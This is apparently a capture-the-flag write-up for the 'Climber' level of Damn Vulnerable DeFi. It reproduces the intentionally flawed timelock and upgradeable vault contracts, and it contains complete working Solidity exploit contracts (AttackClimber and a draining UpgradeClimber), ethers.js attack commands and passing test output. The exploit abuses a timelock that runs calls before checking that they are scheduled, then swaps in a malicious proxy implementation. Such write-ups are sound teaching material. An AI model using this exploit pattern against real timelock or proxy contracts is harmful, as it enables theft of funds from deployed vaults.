<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/12.png">

# Target Contract Review


Given contracts.

**ClimberConstants.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* ########################## */
/* ### TIMELOCK CONSTANTS ### */
/* ########################## */

// keccak256("ADMIN_ROLE");
bytes32 constant ADMIN_ROLE = 0xa49807205ce4d355092ef5a8a18f56e8913cf4a201fbe287825b095693c21775;

// keccak256("PROPOSER_ROLE");
bytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;

uint256 constant MAX_TARGETS = 256;
uint256 constant MIN_TARGETS = 0;
uint256 constant MAX_DELAY = 14 days;

/* ####################### */
/* ### VAULT CONSTANTS ### */
/* ####################### */

uint256 constant WITHDRAWAL_LIMIT = 1 ether;
uint256 constant WAITING_PERIOD = 15 days;

```

**ClimberErrors.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

error CallerNotTimelock();
error NewDelayAboveMax();
error NotReadyForExecution(bytes32 operationId);
error InvalidTargetsCount();
error InvalidDataElementsCount();
error InvalidValuesCount();
error OperationAlreadyKnown(bytes32 operationId);
error CallerNotSweeper();
error InvalidWithdrawalAmount();
error InvalidWithdrawalTime();

```

**ClimberTimeLock.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./ClimberTimelockBase.sol";
import {ADMIN_ROLE, PROPOSER_ROLE, MAX_TARGETS, MIN_TARGETS, MAX_DELAY} from "./ClimberConstants.sol";
import {
    InvalidTargetsCount,
    InvalidDataElementsCount,
    InvalidValuesCount,
    OperationAlreadyKnown,
    NotReadyForExecution,
    CallerNotTimelock,
    NewDelayAboveMax
} from "./ClimberErrors.sol";

/**
 * @title ClimberTimelock
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberTimelock is ClimberTimelockBase {
    using Address for address;

    /**
     * @notice Initial setup for roles and timelock delay.
     * @param admin address of the account that will hold the ADMIN_ROLE role
     * @param proposer address of the account that will hold the PROPOSER_ROLE role
     */
    constructor(address admin, address proposer) {
_setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
_setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
_setupRole(ADMIN_ROLE, admin);
_setupRole(ADMIN_ROLE, address(this)); // self administration
_setupRole(PROPOSER_ROLE, proposer);

delay = 1 hours;
    }

    function schedule(
address[] calldata targets,
uint256[] calldata values,
bytes[] calldata dataElements,
bytes32 salt
    ) external onlyRole(PROPOSER_ROLE) {
if (targets.length == MIN_TARGETS || targets.length >= MAX_TARGETS) {
    revert InvalidTargetsCount();
}

if (targets.length != values.length) {
    revert InvalidValuesCount();
}

if (targets.length != dataElements.length) {
    revert InvalidDataElementsCount();
}

bytes32 id = getOperationId(targets, values, dataElements, salt);

if (getOperationState(id) != OperationState.Unknown) {
    revert OperationAlreadyKnown(id);
}

operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
operations[id].known = true;
    }

    /**
     * Anyone can execute what's been scheduled via `schedule`
     */
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
external
payable
    {
if (targets.length <= MIN_TARGETS) {
    revert InvalidTargetsCount();
}

if (targets.length != values.length) {
    revert InvalidValuesCount();
}

if (targets.length != dataElements.length) {
    revert InvalidDataElementsCount();
}

bytes32 id = getOperationId(targets, values, dataElements, salt);

for (uint8 i = 0; i < targets.length;) {
    targets[i].functionCallWithValue(dataElements[i], values[i]);
    unchecked {
++i;
    }
}

if (getOperationState(id) != OperationState.ReadyForExecution) {
    revert NotReadyForExecution(id);
}

operations[id].executed = true;
    }

    function updateDelay(uint64 newDelay) external {
if (msg.sender != address(this)) {
    revert CallerNotTimelock();
}

if (newDelay > MAX_DELAY) {
    revert NewDelayAboveMax();
}

delay = newDelay;
    }
}
```

**ClimberTimeLockBase.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";

/**
 * @title ClimberTimelockBase
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
abstract contract ClimberTimelockBase is AccessControl {
    // Possible states for an operation in this timelock contract
    enum OperationState {
Unknown,
Scheduled,
ReadyForExecution,
Executed
    }

    // Operation data tracked in this contract
    struct Operation {
uint64 readyAtTimestamp; // timestamp at which the operation will be ready for execution
bool known; // whether the operation is registered in the timelock
bool executed; // whether the operation has been executed
    }

    // Operations are tracked by their bytes32 identifier
    mapping(bytes32 => Operation) public operations;

    uint64 public delay;

    function getOperationState(bytes32 id) public view returns (OperationState state) {
Operation memory op = operations[id];

if (op.known) {
    if (op.executed) {
state = OperationState.Executed;
    } else if (block.timestamp < op.readyAtTimestamp) {
state = OperationState.Scheduled;
    } else {
state = OperationState.ReadyForExecution;
    }
} else {
    state = OperationState.Unknown;
}
    }

    function getOperationId(
address[] calldata targets,
uint256[] calldata values,
bytes[] calldata dataElements,
bytes32 salt
    ) public pure returns (bytes32) {
return keccak256(abi.encode(targets, values, dataElements, salt));
    }

    receive() external payable {}
}
```

**ClimberVault.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
if (msg.sender != _sweeper) {
    revert CallerNotSweeper();
}
_;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
_disableInitializers();
    }

    function initialize(address admin, address proposer, address sweeper) external initializer {
// Initialize inheritance chain
__Ownable_init();
__UUPSUpgradeable_init();

// Deploy timelock and transfer ownership to it
transferOwnership(address(new ClimberTimelock(admin, proposer)));

_setSweeper(sweeper);
_updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(address token, address recipient, uint256 amount) external onlyOwner {
if (amount > WITHDRAWAL_LIMIT) {
    revert InvalidWithdrawalAmount();
}

if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
    revert InvalidWithdrawalTime();
}

_updateLastWithdrawalTimestamp(block.timestamp);

SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
SafeTransferLib.safeTransfer(token, _sweeper, IERC20(token).balanceOf(address(this)));
    }

    function getSweeper() external view returns (address) {
return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
_sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
_lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
```

Challenge's message:

> There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.
The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.
On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.

# Subverting

To pass the challenge, we need to gain ownership of vault for remove execution delay and put ourself on to the schedule. After then, we must take all vault tokens. So, our plan will **include two stages**.

In the `ClimberTimelock` contract, we have `execute()` function that will help us call any functions with value in the contract. 

```solidity
bytes32 id = getOperationId(targets, values, dataElements, salt);

for (uint8 i = 0; i < targets.length;) {
    targets[i].functionCallWithValue(dataElements[i], values[i]);
    unchecked {
      ++i;
    }
}
```

Also this function does not follow correctly the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern).

In Solidity, **it is best practice to complete all checks and modifications to the contract's storage before making any external calls**. Otherwise, you may be faced with some **reentrancy** attacks.

We are aware that certain low-level calls can be executed without prior scheduling, but regardless, the contracts perform the verification check at the end of the function with the statement `(require(getOperationState(id) == OperationState.ReadyForExecution, "NOT ReadyForExecution"))`.

For transferring the ownership of the `ClimbVault` to us, we simply need to have the `ClimbTimelock` contract, which already possesses ownership of the vault, execute the `ClimbVault.transferOwnership()` function.

In the second step, we must be part of the `PROPOSER` role to be able to schedule an operation. Also, the `ClimberTimelock` is part of the admin group. This is important because when we execute a arbitrary call, we can execute a `grantRole(PROPOSER_ROLE, attackContract)` giving to the attack contract the proposer role. At this stage, we have the option to **initiate a low-level call within the attack contract, which will effectively trigger the entire operation**.

What is more, the `getOperationState` function enables us to promptly execute an operation once it has been scheduled. 

While our low-level calls executed by the ClimberTimelock (`msg.sender`) itself, it is crucial to append  `updateDelay(0)` right before scheduling the operation, effectively **setting the new delay to zero and enabling immediate execution without any waiting**.

In my opinion, we are prepared to review the attack contract and monitor its progress:

**AttackClimber.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";
import "../climber/ClimberTimelock.sol";

contract AttackClimber {
  ClimberTimelock timelock;
  ClimberVault vault;

  address[] targets;
  uint256[] values;
  bytes[] datas;

  constructor (address payable _timelock, address _vault) {
    timelock = ClimberTimelock(_timelock);
    vault = ClimberVault(_vault);

    targets = [address(timelock),address(timelock), address(vault),address(this)];
    values = [0,0,0,0];
    datas = [
abi.encodeWithSelector(timelock.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this)),
abi.encodeWithSelector(timelock.updateDelay.selector, 0),
abi.encodeWithSelector(vault.transferOwnership.selector, msg.sender),
abi.encodeWithSignature("schedule()")
    ];
  }

  function schedule() external {
    timelock.schedule(targets, values, datas, hex'');
  }

  function attack() external {
    timelock.execute(targets, values, datas, hex'');
  }
}
```

Get the instances of the contracts.

```solidity
timelock = ClimberTimelock(_timelock);
vault = ClimberVault(_vault);
```

Because of calling `execute()` function, we must embed attacker commands in the `datas[]`. 

```solidity
targets = [address(timelock),address(timelock), address(vault),address(this)];
values = [0,0,0,0];
datas = [
      abi.encodeWithSelector(timelock.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this)), /* Set the attacker as the proposer to be able to schedule tasks */
      abi.encodeWithSelector(timelock.updateDelay.selector, 0), /* Remove execution delay */
      abi.encodeWithSelector(vault.transferOwnership.selector, msg.sender), /* Transfer ownership to us */
      abi.encodeWithSignature("schedule()") /* Create the proposal for reentrancy */ 
];
```

Call the attack() to execute this schedule() function.

```solidity
function schedule() external {
    timelock.schedule(targets, values, datas, hex'');
}

function attack() external {
    timelock.execute(targets, values, datas, hex'');
}
```

After launching the attack, we will have complete control over the vault. As the owner, **we can replace the vault's proxy with our own and bypass all existing security measures, finally, steal all DVT tokens**. 

In the our attack proxy contract, **the storage slots must match the original implementation** required by [UUPSUpgradeable to prevent storage slot collisions](https://github.com/MikeSpa/proxy-pattern). Also, the `_authorizeUpgrade(address)` must be implemented. Th used to determine if an incoming upgrade is valid or not.

**UpgradeClimber.sol**

```solidity
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract UpgradeClimber is Initializable, OwnableUpgradeable, UUPSUpgradeable {
  uint256 _lastWithdrawalTimestamp;
  address _sweeper;

  function drain(address _token) external {
    IERC20 token = IERC20(_token);
    token.transfer(msg.sender, token.balanceOf(address(this)));
  }

  function _authorizeUpgrade(address) internal override {}
}
```

Once we has successfully taken control of the vault, we will proceed to switch the implementation to the new one and execute the stealer function by calling `drain()` function.

Here are the attacker commands:

```js
const AttackFactory = await ethers.getContractFactory('AttackClimber', deployer);
attack = await AttackFactory.connect(player).deploy(timelock.address, vault.address);
await attack.attack();
const upgradeFactory = await ethers.getContractFactory('UpgradeClimber', player);
const upgradedVault = await upgrades.upgradeProxy(vault.address, upgradeFactory);
await upgradedVault.drain(token.address);
```

Solve the challenge.

```powershell
  [Challenge] Climber
    ✔ Execution (270ms)


  1 passing (2s)

Done in 3.60s.
```

**_by wasny0ps_**

